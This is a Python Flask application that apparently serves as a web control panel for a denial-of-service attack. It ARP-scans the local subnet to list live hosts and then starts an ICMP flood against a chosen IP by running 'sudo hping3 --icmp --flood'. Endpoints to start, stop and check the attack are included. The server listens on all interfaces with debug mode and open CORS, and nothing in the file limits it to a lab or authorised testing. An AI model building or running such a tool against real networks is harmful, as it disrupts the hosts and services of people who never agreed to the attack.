#!/usr/bin/env python3

from flask import Flask, render_template, jsonify, request
import scapy.all as scapy
import subprocess
import sys
import time
import os
import threading
import socket
import re
import signal
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Global variables to track attack state
attack_process = None
attack_thread = None
attack_running = False
current_target = None

def in_sudo_mode():
    """Ensure script is run as root."""
    return 'SUDO_UID' in os.environ or os.geteuid() == 0

def get_interface_ip(interface):
    """Get the IP address of a given interface."""
    try:
        output = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
        match = re.search(r"inet (\d+\.\d+\.\d+)\.\d+/\d+", output)
        if match:
            base_ip = match.group(1)
            return f"{base_ip}.0/24"
    except Exception as e:
        print(f"Error getting IP for {interface}: {e}")
        return None

def arp_scan(ip_range):
    """ARP scan the network and return list of live hosts."""
    try:
        arp_responses = []
        answered_lst = scapy.arping(ip_range, verbose=0)[0]
        for res in answered_lst:
            arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
        return arp_responses
    except Exception as e:
        print(f"Error during ARP scan: {e}")
        return []

def get_interface_names():
    """List all network interface names."""
    try:
        return os.listdir("/sys/class/net")
    except:
        return []

def get_main_interface():
    """Get the main network interface."""
    interfaces = [iface for iface in get_interface_names() if iface not in ["lo", "docker0"]]
    
    # Prefer wlan0 if available
    if "wlan0" in interfaces:
        return "wlan0"
    elif interfaces:
        return interfaces[0]
    else:
        return None

def run_attack(target_ip):
    """Run hping3 ICMP flood on target IP in a separate thread."""
    global attack_process, attack_running
    
    try:
        print(f"Starting ICMP flood on {target_ip}")
        attack_process = subprocess.Popen(
            ["sudo", "hping3", "--icmp", "--flood", target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid
        )
        attack_running = True
        attack_process.wait()
    except Exception as e:
        print(f"Error running attack: {e}")
    finally:
        attack_running = False
        attack_process = None

@app.route('/')
def index():
    """Serve the main page."""
    return render_template('index.html')

@app.route('/api/check-privileges')
def check_privileges():
    """Check if running with sudo privileges."""
    return jsonify({"has_sudo": in_sudo_mode()})

@app.route('/api/scan-network')
def scan_network():
    """Scan the network for live hosts."""
    if not in_sudo_mode():
        return jsonify({"error": "Sudo privileges required"}), 403
    
    # Get main interface
    main_iface = get_main_interface()
    if not main_iface:
        return jsonify({"error": "No valid network interface found"}), 500
    
    # Get IP range
    ip_range = get_interface_ip(main_iface)
    if not ip_range:
        return jsonify({"error": f"Could not get IP range for interface {main_iface}"}), 500
    
    # Perform ARP scan
    hosts = arp_scan(ip_range)
    
    return jsonify({
        "interface": main_iface,
        "ip_range": ip_range,
        "hosts": hosts
    })

@app.route('/api/start-attack', methods=['POST'])
def start_attack():
    """Start ICMP flood attack on specified target."""
    global attack_thread, attack_running, current_target
    
    if not in_sudo_mode():
        return jsonify({"error": "Sudo privileges required"}), 403
    
    if attack_running:
        return jsonify({"error": "Attack already running"}), 400
    
    data = request.get_json()
    target_ip = data.get('target_ip')
    
    if not target_ip:
        return jsonify({"error": "Target IP required"}), 400
    
    # Validate IP format
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        return jsonify({"error": "Invalid IP address"}), 400
    
    current_target = target_ip
    attack_thread = threading.Thread(target=run_attack, args=(target_ip,))
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({"message": f"Attack started on {target_ip}"})

@app.route('/api/stop-attack', methods=['POST'])
def stop_attack():
    """Stop the current ICMP flood attack."""
    global attack_process, attack_running, current_target
    
    if not attack_running or not attack_process:
        return jsonify({"error": "No attack currently running"}), 400
    
    try:
        # Kill the process group to ensure hping3 is terminated
        os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
        attack_running = False
        current_target = None
        return jsonify({"message": "Attack stopped"})
    except Exception as e:
        return jsonify({"error": f"Error stopping attack: {str(e)}"}), 500

@app.route('/api/attack-status')
def attack_status():
    """Get current attack status."""
    return jsonify({
        "running": attack_running,
        "target": current_target
    })

if __name__ == '__main__':
    if not in_sudo_mode():
        print("Please run this application with sudo privileges:")
        print("sudo python3 app.py")
        sys.exit(1)
    
    print("Starting ICMP Flood Web Application...")
    print("Access the application at: http://localhost:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)
